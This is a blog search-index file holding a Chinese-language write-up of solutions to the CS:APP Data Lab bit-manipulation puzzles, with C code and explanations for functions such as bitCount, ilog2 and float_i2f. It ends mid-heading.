<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2021/07/04/lab2_datalab/"/>
    <url>/2021/07/04/lab2_datalab/</url>
    
    <content type="html"><![CDATA[<h1 id="lab2-datalab"><a href="#lab2-datalab" class="headerlink" title="lab2_datalab"></a>lab2_datalab</h1><h2 id="1-bitAnd"><a href="#1-bitAnd" class="headerlink" title="1.bitAnd"></a>1.bitAnd</h2><p>这个很简单</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * bitAnd - x&amp;y using only ~ and | </span><br><span class="hljs-comment"> *   Example: bitAnd(6, 5) = 4</span><br><span class="hljs-comment"> *   Legal ops: ~ |</span><br><span class="hljs-comment"> *   Max ops: 8</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bitAnd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br><br>  <span class="hljs-keyword">return</span> ~(~x|~y);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-getByte"><a href="#2-getByte" class="headerlink" title="2.getByte"></a>2.getByte</h2><p>舍掉最后的n个字节，即n*8位，并保留舍掉后的最后8位</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * getByte - Extract byte n from word x</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Bytes numbered from 0 (LSB) to 3 (MSB)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Examples: getByte(0x12345678,1) = 0x56</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Max ops: 6</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Rating: 2</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getByte</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>   <span class="hljs-keyword">int</span> tmp =x&gt;&gt;(n&lt;&lt;<span class="hljs-number">3</span>);<span class="hljs-comment">//将目标移到最后</span><br>   tmp=tmp&amp;<span class="hljs-number">0xFF</span>;<span class="hljs-comment">//保留目标</span><br>   <span class="hljs-keyword">return</span> tmp;<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="3-logicalShift"><a href="#3-logicalShift" class="headerlink" title="3.logicalShift"></a>3.logicalShift</h2><p>对x进行逻辑右移（算术右移补符号位，逻辑右移补0），可以采用先进行算术右移，然后将右移多出来的符号位置0。</p><p>因为不能使用减号，所以将1左移31位后采用先右移n,再左移1位的方法，最后取反。</p><p>与算术右移进行与即可得到结果</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * logicalShift - shift x to the right by n, using a logical shift</span><br><span class="hljs-comment"> *   Can assume that 0 &lt;= n &lt;= 31</span><br><span class="hljs-comment"> *   Examples: logicalShift(0x87654321,4) = 0x08765432</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 20</span><br><span class="hljs-comment"> *   Rating: 3 </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">logicalShift</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br><span class="hljs-keyword">int</span> result = (x &gt;&gt; n) &amp; (~(((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span>) &gt;&gt; n) &lt;&lt; <span class="hljs-number">1</span>));<br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-bitCount"><a href="#4-bitCount" class="headerlink" title="4.bitCount"></a>4.bitCount</h2><p>此问题较为复杂，参考了网上的做法，采用自底向上的方式进行求解，先求两位中1的个数、再求四位中1的个数……最后求三十二位中1的个数</p><p>具体过程如图所示:</p><p><img src="/2021/07/04/lab2_datalab/image-20210406160622289.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * bitCount - returns count of number of 1&#x27;s in word</span><br><span class="hljs-comment"> *   Examples: bitCount(5) = 2, bitCount(7) = 3</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 40</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bitCount</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br><span class="hljs-keyword">int</span> mask_1,mask_2,mask_4,mask_8,mask_16;<br><br>  mask_1=<span class="hljs-number">0x55</span>|(<span class="hljs-number">0x55</span>&lt;&lt;<span class="hljs-number">8</span>);<br>  mask_1=mask_1|(mask_1&lt;&lt;<span class="hljs-number">16</span>);<span class="hljs-comment">//计算得到0x55555555,即01010101···</span><br>  mask_2=<span class="hljs-number">0x33</span>|(<span class="hljs-number">0x33</span>&lt;&lt;<span class="hljs-number">8</span>);<br>  mask_2=mask_2|(mask_2&lt;&lt;<span class="hljs-number">16</span>);<span class="hljs-comment">//计算得到0x33333333,即00110011···</span><br>  mask_4=<span class="hljs-number">0x0f</span>|(<span class="hljs-number">0x0f</span>&lt;&lt;<span class="hljs-number">8</span>);<br>  mask_4=mask_4|(mask_4&lt;&lt;<span class="hljs-number">16</span>);<span class="hljs-comment">//计算得到0x0f0f0f0f,即00001111···</span><br>  mask_8=<span class="hljs-number">0xff</span>|(<span class="hljs-number">0xff</span>&lt;&lt;<span class="hljs-number">16</span>);<span class="hljs-comment">//0000000011111111 0000000011111111</span><br>  mask_16=<span class="hljs-number">0xff</span>|(<span class="hljs-number">0xff</span>&lt;&lt;<span class="hljs-number">8</span>);<span class="hljs-comment">//00000000000000001111111111111111</span><br>  x=(x&amp;mask_1)+((x&gt;&gt;<span class="hljs-number">1</span>)&amp;mask_1);<br>  x=(x&amp;mask_2)+((x&gt;&gt;<span class="hljs-number">2</span>)&amp;mask_2);<br>  <span class="hljs-comment">//下面三组最高位不会是1了 </span><br>  x=(x+(x&gt;&gt;<span class="hljs-number">4</span>))&amp;mask_4;<span class="hljs-comment">//x=(x&amp;mask_4)+((x&gt;&gt;4)&amp;mask_4);</span><br>  x=(x+(x&gt;&gt;<span class="hljs-number">8</span>))&amp;mask_8;<span class="hljs-comment">//x=(x&amp;mask_8)+((x&gt;&gt;8)&amp;mask_8);</span><br>  x=(x+(x&gt;&gt;<span class="hljs-number">16</span>))&amp;mask_16;<span class="hljs-comment">//x=(x&amp;mask_16)+((x&gt;&gt;16)&amp;mask_16);</span><br>  <span class="hljs-keyword">return</span> x;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-bang"><a href="#5-bang" class="headerlink" title="5.bang"></a>5.bang</h2><p>不利用逻辑符号!求一个数的逻辑非，也就是判断该数的二进制位<strong>是否全为0</strong>，若全为0则返回1，否则返回0。</p><p>一个<strong>求补码</strong>的方法：<strong>从最低位到第一个1之间不变，其他位按位取反</strong>。</p><p>一个数与其补码相或后，只有0x00000000的结果最高位是0，其他数结果都是1，所以我们将原数与其补码相或后右移31位得到最高位，将最高位与1相与，结果为0说明原数是0，取反后输出1，否则说明原数不为0，取反后输出0。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * bang - Compute !x without using !</span><br><span class="hljs-comment"> *   Examples: bang(3) = 0, bang(0) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 4 </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bang</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br><br> <span class="hljs-keyword">return</span> ~((x|(~x+<span class="hljs-number">1</span>))&gt;&gt;<span class="hljs-number">31</span>)&amp;<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-tmin"><a href="#6-tmin" class="headerlink" title="6.tmin"></a>6.tmin</h2><p>返回 最小的二进制补码，为0x 8000 0000，直接左移31位即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * tmin - return minimum two&#x27;s complement integer </span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 4</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">tmin</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-fitsBits"><a href="#7-fitsBits" class="headerlink" title="7.fitsBits"></a>7.fitsBits</h2><p>判断一个数能否表示成n位的二进制，能则返回1，不能返回0</p><p>关键在于这个n位是包括符号位的，即对于一个整数，其最高位应为0，对于一个负数，最高位为1</p><p>先左移32-n 再右移32-n,考虑符号位，若与x相等则说明可以。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * fitsBits - return 1 if x can be represented as an </span><br><span class="hljs-comment"> * n-bit, two&#x27;s complement integer.</span><br><span class="hljs-comment"> * 1 &lt;= n &lt;= 32</span><br><span class="hljs-comment"> * Examples: fitsBits(5,3) = 0, fitsBits(-4,3) = 1</span><br><span class="hljs-comment"> * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> * Max ops: 15</span><br><span class="hljs-comment"> * Rating: 2</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fitsBits</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>   <span class="hljs-keyword">int</span> shiftNumber= <span class="hljs-number">32</span> + (~n + <span class="hljs-number">1</span>);<span class="hljs-comment">// 32 - n</span><br>   <span class="hljs-keyword">return</span> !(x^((x&lt;&lt;shiftNumber)&gt;&gt;shiftNumber));<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="8-divpwr2"><a href="#8-divpwr2" class="headerlink" title="8.divpwr2"></a>8.divpwr2</h2><p>将一个数除以2的n次方</p><p>除法是向下取整，正数位运算和除法运算相同，负数除法向0取整，位运算向下取整，<br> 所以要靠位运算来实现负数除法就要加一个偏置量，使其变成比原来的数小2^n个单位的数<br> 使得新数通过位运算的向下取整和原数的向0取整结果相同</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * divpwr2 - Compute x/(2^n), for 0 &lt;= n &lt;= 30</span><br><span class="hljs-comment"> *  Round toward zero</span><br><span class="hljs-comment"> *   Examples: divpwr2(15,1) = 7, divpwr2(-33,4) = -2</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 15</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">divpwr2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br><span class="hljs-keyword">int</span> signx=x&gt;&gt;<span class="hljs-number">31</span>;<br><span class="hljs-keyword">int</span> mask =(<span class="hljs-number">1</span>&lt;&lt;n)+(~<span class="hljs-number">0</span>);<br><span class="hljs-keyword">int</span> bias=signx&amp;mask;<br>    <span class="hljs-keyword">return</span> (bias+x)&gt;&gt;n;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="9-negate"><a href="#9-negate" class="headerlink" title="9.negate"></a>9.negate</h2><p>返回-x，很简单</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * negate - return -x </span><br><span class="hljs-comment"> *   Example: negate(1) = -1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 5</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">negate</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> ~x+<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="10-isPositive"><a href="#10-isPositive" class="headerlink" title="10.isPositive"></a>10.isPositive</h2><p>正数符号位为0，负数符号位为，0的符号位也是0。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isPositive - return 1 if x &gt; 0, return 0 otherwise </span><br><span class="hljs-comment"> *   Example: isPositive(-1) = 0.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 8</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isPositive</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> !(x&gt;&gt;<span class="hljs-number">31</span>|!x);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="11-isLessOrEqual"><a href="#11-isLessOrEqual" class="headerlink" title="11.isLessOrEqual"></a>11.isLessOrEqual</h2><p>这道题相当于枚举 x&lt;=y 的所有情况：<br> 1.x为负数，y 为正数<br> 2.x 等于 y<br> 3.x 和 y 符号相同，并且 y-x 为正数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span><br><span class="hljs-comment"> *   Example: isLessOrEqual(4,5) = 1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 24</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isLessOrEqual</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br><span class="hljs-keyword">int</span> signx = (x&gt;&gt;<span class="hljs-number">31</span>) &amp; <span class="hljs-number">0x1</span>;<br><span class="hljs-keyword">int</span> signy = (y&gt;&gt;<span class="hljs-number">31</span>) &amp; <span class="hljs-number">0x1</span>;<br><span class="hljs-keyword">int</span> tmp = signx ^ signy;<br><span class="hljs-keyword">int</span> tmp1 = tmp &amp; signx;<span class="hljs-comment">//为1时表示x为负数，y为正数</span><br><span class="hljs-keyword">int</span> y_x=y+(~x+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> tmp1|(!(x^y))|(!tmp&amp;!(y_x&amp;(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>)));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="12-ilog2"><a href="#12-ilog2" class="headerlink" title="12.ilog2"></a>12.ilog2</h2><p>求一个数是2的几次幂，即求最高位的1的索引（0-31）</p><p>也是二分，先去掉后16位，先判断左边16位，若全是0，则!!(x&gt;&gt;16)返回0，否则返回1,1&lt;&lt;4则记录左边16位的最低位索引</p><p>若前16位中含1，则只保留了前16位，否则前16的0可以忽略，相当于考虑后16位</p><p>之后同理，将16位二分，然后记录索引。</p><p>全部索引相加就是结果</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ilog2 - return floor(log base 2 of x), where x &gt; 0</span><br><span class="hljs-comment"> *   Example: ilog2(16) = 4</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 90</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">ilog2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br><span class="hljs-keyword">int</span> bitsNumber = <span class="hljs-number">0</span>;<br>bitsNumber = (!!(x &gt;&gt; <span class="hljs-number">16</span>)) &lt;&lt; <span class="hljs-number">4</span>;<span class="hljs-comment">//去掉后16位，判断左边16位是否全为0，不是则记录左边16位的最低位索引</span><br>bitsNumber += (!!(x &gt;&gt; (bitsNumber + <span class="hljs-number">8</span>)) &lt;&lt; <span class="hljs-number">3</span>);<span class="hljs-comment">//判断左边16位是否全为0，不是则记录左边位8的最低位索引</span><br>bitsNumber += (!!(x &gt;&gt; (bitsNumber + <span class="hljs-number">4</span>)) &lt;&lt; <span class="hljs-number">2</span>);<span class="hljs-comment">//</span><br>bitsNumber += (!!(x &gt;&gt; (bitsNumber + <span class="hljs-number">2</span>)) &lt;&lt; <span class="hljs-number">1</span>);<span class="hljs-comment">//</span><br>bitsNumber += (!!(x &gt;&gt; (bitsNumber + <span class="hljs-number">1</span>)));<span class="hljs-comment">//</span><br><span class="hljs-keyword">return</span> bitsNumber;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="13-float-neg"><a href="#13-float-neg" class="headerlink" title="13.float_neg"></a>13.float_neg</h2><p>返回一个无符号浮点数的负的单精度浮点数表达，参数NaN（阶码全为1，小数域非0）时返回原值</p><p>关键在于NaN的判断，其他参数加上一个符号位即可；</p><p>((uf&gt;&gt;23)&amp;0xff)^0xff判断阶码是否全为1，是的话结果为0，!(uf&amp;((1&lt;&lt;23)-1))判断小数域是否全为0，是的话为1</p><p>所以代码含义就是：</p><p>if(不是NaN)加符号位</p><p>否则返回原参数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * float_neg - Return bit-level equivalent of expression -f for</span><br><span class="hljs-comment"> *   floating point argument f.</span><br><span class="hljs-comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span><br><span class="hljs-comment"> *   they are to be interpreted as the bit-level representations of</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   When argument is NaN, return argument.</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 10</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-title">float_neg</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> uf)</span> </span>&#123;<br><span class="hljs-keyword">if</span>((((uf&gt;&gt;<span class="hljs-number">23</span>)&amp;<span class="hljs-number">0xff</span>)^<span class="hljs-number">0xff</span>)||!(uf&amp;((<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">23</span>)<span class="hljs-number">-1</span>))) uf=(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>)^uf;<br><br>  <span class="hljs-keyword">return</span> uf;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="14-float-i2f"><a href="#14-float-i2f" class="headerlink" title="14.float_i2f"></a>14.float_i2f</h2><p>将一个int型数转化为浮点型。</p><p>问题重点在于考虑浮点数的舍入</p><ul><li><p>浮点数舍入规则</p><p>如果以形式1.RR..RDD..D表示浮点数（R表示有效位，或保留位，而D表示舍去位），舍入规则就是：</p><p>如果DD..D &lt; 10..0，则向下舍入</p><p>如果DD..D &gt; 10..0，则向上舍入</p><p>如要DD..D = 10..0，则向最近偶数舍入，细则如下 ：</p><p>a. 如果RR..R = XX..0 （最低有效位是0），则向下舍入</p><p>b. 如果RR..R = XX..1（最低有效位是1），则向上舍入</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * float_i2f - Return bit-level equivalent of expression (float) x</span><br><span class="hljs-comment"> *   Result is returned as unsigned int, but</span><br><span class="hljs-comment"> *   it is to be interpreted as the bit-level representation of a</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-title">float_i2f</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>    <span class="hljs-keyword">unsigned</span> shiftLeft=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">unsigned</span> afterShift, tmp, flag;<br>    <span class="hljs-keyword">unsigned</span> absX=x;<br>    <span class="hljs-keyword">unsigned</span> sign=<span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//special case</span><br>    <span class="hljs-keyword">if</span> (x==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//if x &lt; 0, sign = 1000...,abs_x = -x</span><br>    <span class="hljs-keyword">if</span> (x&lt;<span class="hljs-number">0</span>)<span class="hljs-comment">//小于0，则取反</span><br>    &#123;<br>sign=<span class="hljs-number">0x80000000</span>;<br>absX=-x;<br>    &#125;<br>    afterShift=absX;<br>    <span class="hljs-comment">//count shift_left and after_shift</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<span class="hljs-comment">//计算阶码E=32-shiftLeft，aftershift保留尾数的值</span><br>    &#123;<br>tmp=afterShift;<br>afterShift&lt;&lt;=<span class="hljs-number">1</span>;<br>shiftLeft++;<br><span class="hljs-keyword">if</span> (tmp &amp; <span class="hljs-number">0x80000000</span>) <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">//afterShift的前23位保留作为尾数，要考虑舍入</span><br>    <span class="hljs-keyword">if</span> ((afterShift &amp; <span class="hljs-number">0x01ff</span>)&gt;<span class="hljs-number">0x0100</span>)<span class="hljs-comment">//进位</span><br>flag=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((afterShift &amp; <span class="hljs-number">0x03ff</span>)==<span class="hljs-number">0x0300</span>)<span class="hljs-comment">//向偶数舍入</span><br>flag=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span><br>flag=<span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">return</span> sign +((<span class="hljs-number">127</span>+<span class="hljs-number">32</span>-shiftLeft)&lt;&lt;<span class="hljs-number">23</span>) +(afterShift&gt;&gt;<span class="hljs-number">9</span>) + flag;<br>    <span class="hljs-comment">//符号位+阶码+尾数+舍入值</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="15-float-twice"><a href="#15-float-twice" class="headerlink" 